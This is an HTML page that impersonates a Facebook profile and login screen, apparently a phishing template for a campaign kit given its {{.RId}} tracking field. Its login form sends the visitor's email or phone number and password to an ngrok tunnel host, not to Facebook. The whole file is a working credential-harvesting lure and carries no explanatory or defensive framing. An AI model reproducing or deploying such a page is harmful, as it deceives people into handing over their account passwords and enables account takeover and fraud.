<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Muhammad Haneef | Facebook</title>
    <meta property="og:title" content="Muhammad Haneef">
    <meta property="og:description" content="View Haneef's profile on Facebook. Log in or sign up to view photos and updates.">
    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
    <meta property="og:type" content="profile">
    <meta property="og:site_name" content="Facebook">
    <link href="https://www.facebook.com/favicon.ico" rel="icon" type="image/x-icon"/>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; }
        .logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; letter-spacing: -1px; }
        .login-box { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); width: 100%; max-width: 396px; text-align: center; box-sizing: border-box; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 20px; font-weight: bold; cursor: pointer; }
        .forgot { color: #1877f2; font-size: 14px; text-decoration: none; margin-top: 16px; display: block; }
        hr { border: 0; border-top: 1px solid #dadde1; margin: 20px 0; }
        .create-btn { background-color: #42b72a; border: none; border-radius: 6px; color: #fff; padding: 12px 16px; font-size: 17px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="logo">facebook</div>
    <div class="login-box">
        <p style="font-size: 18px; margin-bottom: 20px;">Log Into Facebook</p>
        <form method="POST" action="https://cathectic-campily-ehtel.ngrok-free.dev/">
            <input type="hidden" name="rid" value="{{.RId}}">   
            <input autofocus="" name="username" placeholder="Email or Phone Number" required="" type="text"/> 
            <input name="password" placeholder="Password" required="" type="password"/>
            <button type="submit">Log In</button>
        </form>
        <a class="forgot" href="#">Forgot account?</a>
        <hr/>
        <button class="create-btn" type="button">Create New Account</button>
    </div>
</body>
</html>
